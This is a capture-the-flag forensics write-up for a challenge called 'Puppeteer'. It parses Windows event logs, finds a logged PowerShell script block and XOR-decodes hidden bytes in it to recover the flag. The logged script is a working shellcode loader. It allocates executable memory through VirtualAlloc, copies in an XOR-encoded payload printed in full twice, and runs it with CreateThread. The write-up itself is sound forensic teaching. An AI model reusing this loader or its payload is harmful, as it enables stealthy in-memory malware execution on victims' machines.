# Puppeteer (Forensics)

After extracting the challenge .zip file, we are left with 143 .evtx files.  A little research on [FileInfo.com](https://fileinfo.com/extension/evtx) lets us know what .evtx files are:

> Log file created by the Windows 7 Event Viewer; contains a list of events recorded by Windows; saved in a proprietary binary format that can only be viewed within the Event Viewer program.

## Initial Steps

First step, we need to find a program to view these files and look for interesting data.  Found the following repo on GitHub that looked promising: https://github.com/williballenthin/python-evtx

Looked at a few different .evtx files without seeing much of anything interesting.  However, the `Microsoft-Windows-Powershell%4Operational.evtx` had some interesting tidbits.

`evtx_dump.py Microsoft-Windows-Powershell%4Operational.evtx`

```xml
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"></Provider>
    <EventID Qualifiers="">4104</EventID>
    <Version>1</Version>
    <Level>3</Level>
    <Task>2</Task>
    <Opcode>15</Opcode>
    <Keywords>0x0000000000000000</Keywords>
    <TimeCreated SystemTime="2022-05-06 15:40:31.473396"></TimeCreated>
    <EventRecordID>7</EventRecordID>
    <Correlation ActivityID="{0e625a87-615f-0003-92d0-620e5f61d801}" RelatedActivityID=""></Correlation>
    <Execution ProcessID="1352" ThreadID="5472"></Execution>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>Council-HQ</Computer>
    <Security UserID="S-1-5-21-2389065719-3342106636-307857974-1001"></Security>
    </System>
    <EventData><Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">$OleSPrlmhB = @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    "@
    
    [byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
    [byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;
    
    $tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name "Win32" -namespace Win32Functions -passthru;
    
    [Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;
    
    [array]::Reverse($stage2);
    
    $hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);
    
    $stage3 = $stage1 + $stage2;
    
    [System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);
    
    
    # Unpack Shellcode;
    
    for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++)
    {
        $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;
    }
    
    #Unpack Special Orders!
    
    for($i=0;$i -lt $stage3.count;$i++){
        $stage3[$i] = $stage3[$i] -bxor 0xd1;
    }
    
    $tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);
    </Data>
    <Data Name="ScriptBlockId">3f384b05-3a00-4a65-bbf7-e31b331ac923</Data>
    <Data Name="Path">C:\sysmgr\special_orders.ps1</Data>
    </EventData>
    </Event>
```

## Examining the Code

First, we have two interesting variables defined as an array of hexadecimal bytes:
```powershell
[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;
[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;
```

Next, we see a very long variable comprised of hexadecimal bytes:
```powershell    
[Byte[]] $HVOASfFuNSxRXR = 0x2d, 0x99, 0x52, 0x35, 0x21, 0x39, 0x1d, 0xd1, 0xd1, 0xd1, 0x90, 0x80, 0x90, 0x81, 0x83, 0x99, 0xe0, 0x03, 0xb4, 0x99, 0x5a, 0x83, 0xb1, 0x99, 0x5a, 0x83, 0xc9, 0x80, 0x87, 0x99, 0x5a, 0x83, 0xf1, 0x99, 0xde, 0x66, 0x9b, 0x9b, 0x9c, 0xe0, 0x18, 0x99, 0x5a, 0xa3, 0x81, 0x99, 0xe0, 0x11, 0x7d, 0xed, 0xb0, 0xad, 0xd3, 0xfd, 0xf1, 0x90, 0x10, 0x18, 0xdc, 0x90, 0xd0, 0x10, 0x33, 0x3c, 0x83, 0x99, 0x5a, 0x83, 0xf1, 0x90, 0x80, 0x5a, 0x93, 0xed, 0x99, 0xd0, 0x01, 0xb7, 0x50, 0xa9, 0xc9, 0xda, 0xd3, 0xde, 0x54, 0xa3, 0xd1, 0xd1, 0xd1, 0x5a, 0x51, 0x59, 0xd1, 0xd1, 0xd1, 0x99, 0x54, 0x11, 0xa5, 0xb6, 0x99, 0xd0, 0x01, 0x5a, 0x99, 0xc9, 0x81, 0x95, 0x5a, 0x91, 0xf1, 0x98, 0xd0, 0x01, 0x32, 0x87, 0x99, 0x2e, 0x18, 0x9c, 0xe0, 0x18, 0x90, 0x5a, 0xe5, 0x59, 0x99, 0xd0, 0x07, 0x99, 0xe0, 0x11, 0x90, 0x10, 0x18, 0xdc, 0x7d, 0x90, 0xd0, 0x10, 0xe9, 0x31, 0xa4, 0x20, 0x9d, 0xd2, 0x9d, 0xf5, 0xd9, 0x94, 0xe8, 0x00, 0xa4, 0x09, 0x89, 0x95, 0x5a, 0x91, 0xf5, 0x98, 0xd0, 0x01, 0xb7, 0x90, 0x5a, 0xdd, 0x99, 0x95, 0x5a, 0x91, 0xcd, 0x98, 0xd0, 0x01, 0x90, 0x5a, 0xd5, 0x59, 0x90, 0x89, 0x90, 0x89, 0x8f, 0x88, 0x99, 0xd0, 0x01, 0x8b, 0x90, 0x89, 0x90, 0x88, 0x90, 0x8b, 0x99, 0x52, 0x3d, 0xf1, 0x90, 0x83, 0x2e, 0x31, 0x89, 0x90, 0x88, 0x8b, 0x99, 0x5a, 0xc3, 0x38, 0x9a, 0x2e, 0x2e, 0x2e, 0x8c, 0x98, 0x6f, 0xa6, 0xa2, 0xe3, 0x8e, 0xe2, 0xe3, 0xd1, 0xd1, 0x90, 0x87, 0x98, 0x58, 0x37, 0x99, 0x50, 0x3d, 0x71, 0xd0, 0xd1, 0xd1, 0x98, 0x58, 0x34, 0x98, 0x6d, 0xd3, 0xd1, 0xd4, 0xe8, 0x11, 0x79, 0xd1, 0xc3, 0x90, 0x85, 0x98, 0x58, 0x35, 0x9d, 0x58, 0x20, 0x90, 0x6b, 0x9d, 0xa6, 0xf7, 0xd6, 0x2e, 0x04, 0x9d, 0x58, 0x3b, 0xb9, 0xd0, 0xd0, 0xd1, 0xd1, 0x88, 0x90, 0x6b, 0xf8, 0x51, 0xba, 0xd1, 0x2e, 0x04, 0xbb, 0xdb, 0x90, 0x8f, 0x81, 0x81, 0x9c, 0xe0, 0x18, 0x9c, 0xe0, 0x11, 0x99, 0x2e, 0x11, 0x99, 0x58, 0x13, 0x99, 0x2e, 0x11, 0x99, 0x58, 0x10, 0x90, 0x6b, 0x3b, 0xde, 0x0e, 0x31, 0x2e, 0x04, 0x99, 0x58, 0x16, 0xbb, 0xc1, 0x90, 0x89, 0x9d, 0x58, 0x33, 0x99, 0x58, 0x28, 0x90, 0x6b, 0x48, 0x74, 0xa5, 0xb0, 0x2e, 0x04, 0x54, 0x11, 0xa5, 0xdb, 0x98, 0x2e, 0x1f, 0xa4, 0x34, 0x39, 0x42, 0xd1, 0xd1, 0xd1, 0x99, 0x52, 0x3d, 0xc1, 0x99, 0x58, 0x33, 0x9c, 0xe0, 0x18, 0xbb, 0xd5, 0x90, 0x89, 0x99, 0x58, 0x28, 0x90, 0x6b, 0xd3, 0x08, 0x19, 0x8e, 0x2e, 0x04, 0x52, 0x29, 0xd1, 0xaf, 0x84, 0x99, 0x52, 0x15, 0xf1, 0x8f, 0x58, 0x27, 0xbb, 0x91, 0x90, 0x88, 0xb9, 0xd1, 0xc1, 0xd1, 0xd1, 0x90, 0x89, 0x99, 0x58, 0x23, 0x99, 0xe0, 0x18, 0x90, 0x6b, 0x89, 0x75, 0x82, 0x34, 0x2e, 0x04, 0x99, 0x58, 0x12, 0x98, 0x58, 0x16, 0x9c, 0xe0, 0x18, 0x98, 0x58, 0x21, 0x99, 0x58, 0x0b, 0x99, 0x58, 0x28, 0x90, 0x6b, 0xd3, 0x08, 0x19, 0x8e, 0x2e, 0x04, 0x52, 0x29, 0xd1, 0xac, 0xf9, 0x89, 0x90, 0x86, 0x88, 0xb9, 0xd1, 0x91, 0xd1, 0xd1, 0x90, 0x89, 0xbb, 0xd1, 0x8b, 0x90, 0x6b, 0xda, 0xfe, 0xde, 0xe1, 0x2e, 0x04, 0x86, 0x88, 0x90, 0x6b, 0xa4, 0xbf, 0x9c, 0xb0, 0x2e, 0x04, 0x98, 0x2e, 0x1f, 0x38, 0xed, 0x2e, 0x2e, 0x2e, 0x99, 0xd0, 0x12, 0x99, 0xf8, 0x17, 0x99, 0x54, 0x27, 0xa4, 0x65, 0x90, 0x2e, 0x36, 0x89, 0xbb, 0xd1, 0x88, 0x98, 0x16, 0x13, 0x21, 0x64, 0x73, 0x87, 0x2e, 0x04;
```

Time to start manipulating the data:
```powershell
[array]::Reverse($stage2);
# $stage2 now equals = 0xe1, 0xe1, 0xa5, 0xe4, 0x8e, 0xe1, 0xb7, 0x8e, 0xbb, 0xa4, 0xa2, 0xa5, 0xe0, 0xb2, 0xe2, 0xff, 0xff, 0xff, 0xac
```

Moving on further:
```powershell
$stage3 = $stage1 + $stage2;
# $stage3 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3, 0xe1, 0xe1, 0xa5, 0xe4, 0x8e, 0xe1, 0xb7, 0x8e, 0xbb, 0xa4, 0xa2, 0xa5, 0xe0, 0xb2, 0xe2, 0xff, 0xff, 0xff, 0xac
```

At this point, not sure if I'm interested in the shellcode.  However, seeing how we unpack the special orders looks interesting.  Seems we XOR `$stage3` by 0xd1:
```powershell
for($i=0;$i -lt $stage3.count;$i++)
{
    $stage3[$i] = $stage3[$i] -bxor 0xd1;
}
```

![XOR on CyberChef](https://raw.githubusercontent.com/tkrebby/HtB_Stuff/master/CA2022/images/puppeteer1.png)

And there's your flag: `HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3...}`
